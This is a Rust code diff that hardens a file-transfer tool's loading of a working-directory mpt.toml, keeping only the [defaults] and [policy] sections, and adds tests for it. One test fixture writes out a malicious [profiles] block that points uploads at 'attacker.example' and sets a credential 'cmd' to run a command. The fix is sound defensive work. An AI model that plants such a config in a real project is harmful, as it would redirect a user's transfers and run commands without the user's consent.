@@ -387,24 +387,30 @@ impl Config {
     /// Read `./mpt.toml`, keeping only the sections that are safe to take
     /// from the working directory.
     fn read_local(path: &Path) -> Result<Option<Config>> {
-        let mut cfg = Config::read(path)?;
+        let cfg = Config::read(path)?;
         let ignored = cfg.non_local_sections();
+        // An allow-list, not a strip-list: what a working directory may
+        // contribute is named here and nothing else survives, so a section
+        // added to `Config` later is dropped until someone decides otherwise.
+        // The reverse — dropping the sections we happened to think of — let
+        // [profiles] and [http] through, and a profile carries both a target
+        // and a `cmd` credential provider.
+        let mut local = Config {
+            defaults: cfg.defaults,
+            policy: cfg.policy,
+            sources: cfg.sources,
+            warnings: cfg.warnings,
+            ..Config::default()
+        };
         if !ignored.is_empty() {
-            cfg.warnings.push(format!(
+            local.warnings.push(format!(
                 "{}: ignoring [{}] — a configuration file in the working directory \
                  only contributes [defaults] and [policy]",
                 path.display(),
                 ignored.join("], [")
             ));
-            cfg.signing = SigningSection::default();
-            cfg.verify = VerifySection::default();
-            cfg.ssh = SshSection::default();
-            cfg.mail = MailSection::default();
-            cfg.s3 = S3Section::default();
-            cfg.http = HttpSection::default();
-            cfg.profiles.clear();
         }
-        Ok(Some(cfg))
+        Ok(Some(local))
     }
 
     /// Sections that `./mpt.toml` is not allowed to set.
@@ -473,6 +479,13 @@ impl Config {
             || profile.is_some()
         {
             out.push("s3");
+        }
+        let HttpSection { token } = &self.http;
+        if token.is_some() {
+            out.push("http");
+        }
+        if !self.profiles.is_empty() {
+            out.push("profiles");
         }
         out
     }
@@ -1143,14 +1156,87 @@ mod tests {
         assert!(err.contains("url"), "{err}");
     }
 
-    #[test]
-    fn a_local_file_only_contributes_defaults_and_policy() {
+    /// Write `text` to a file called `mpt.toml` and read it the way the
+    /// working directory's file is read.
+    fn local(text: &str) -> (tempfile::TempDir, Config) {
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("mpt.toml");
-        std::fs::write(&path, "[defaults]\ntimeout = 5\n[ssh]\nuser = \"nobody\"\n").unwrap();
+        std::fs::write(&path, text).unwrap();
         let cfg = Config::read_local(&path).unwrap().unwrap();
+        (dir, cfg)
+    }
+
+    #[test]
+    fn a_local_file_only_contributes_defaults_and_policy() {
+        let (_dir, cfg) = local(
+            "[defaults]\ntimeout = 5\n[policy]\nknown_hosts = \"off\"\n[ssh]\nuser = \"nobody\"\n",
+        );
         assert_eq!(cfg.defaults.timeout, Some(5));
+        assert_eq!(cfg.policy.known_hosts.as_deref(), Some("off"));
         assert!(cfg.ssh.user.is_none(), "[ssh] must be dropped");
+        assert!(
+            cfg.warnings.iter().any(|w| w.contains("[ssh]")),
+            "{:?}",
+            cfg.warnings
+        );
+    }
+
+    /// A file in the working directory must not name a target or a
+    /// credential command, and being the *only* section in the file must not
+    /// let one through: a `[profiles]` block redirects `mpt://name/`
+    /// elsewhere and its `password = { cmd = … }` runs on the next transfer.
+    #[test]
+    fn a_local_file_cannot_smuggle_in_a_profile() {
+        let (_dir, cfg) = local(
+            r#"
+            [profiles.prod]
+            url = "sftp://attacker.example/incoming/"
+            password = { cmd = "touch /tmp/mpt-should-not-run" }
+            "#,
+        );
+        assert!(cfg.profiles.is_empty(), "[profiles] must be dropped");
+        assert!(
+            cfg.warnings.iter().any(|w| w.contains("[profiles]")),
+            "the reason must be reported: {:?}",
+            cfg.warnings
+        );
+    }
+
+    #[test]
+    fn a_local_file_cannot_set_an_http_token() {
+        let (_dir, cfg) = local("[http]\ntoken = { cmd = \"echo t\" }\n");
+        assert!(cfg.http.token.is_none(), "[http] must be dropped");
+        assert!(
+            cfg.warnings.iter().any(|w| w.contains("[http]")),
+            "{:?}",
+            cfg.warnings
+        );
+    }
+
+    /// Every section but the two allowed ones goes, whether or not it is the
+    /// only thing in the file.
+    #[test]
+    fn a_local_file_drops_every_other_section_on_its_own() {
+        for (section, text) in [
+            ("signing", "[signing]\nkey = \"ssh:/k\"\n"),
+            ("verify", "[verify]\nallowed_signers = \"/a\"\n"),
+            ("ssh", "[ssh]\nkey = \"/k\"\n"),
+            ("mail", "[mail]\nfrom = \"a@b.c\"\n"),
+            ("s3", "[s3]\nendpoint = \"https://x\"\n"),
+            ("http", "[http]\ntoken = { env = \"T\" }\n"),
+            ("profiles", "[profiles.p]\nurl = \"sftp://h/\"\n"),
+        ] {
+            let (_dir, cfg) = local(text);
+            assert!(
+                cfg.non_local_sections().is_empty(),
+                "[{section}] survived on its own"
+            );
+            assert!(
+                cfg.warnings.iter().any(|w| w.contains(section)),
+                "[{section}] was dropped without saying so: {:?}",
+                cfg.warnings
+            );
+        }
     }
 
     #[test]
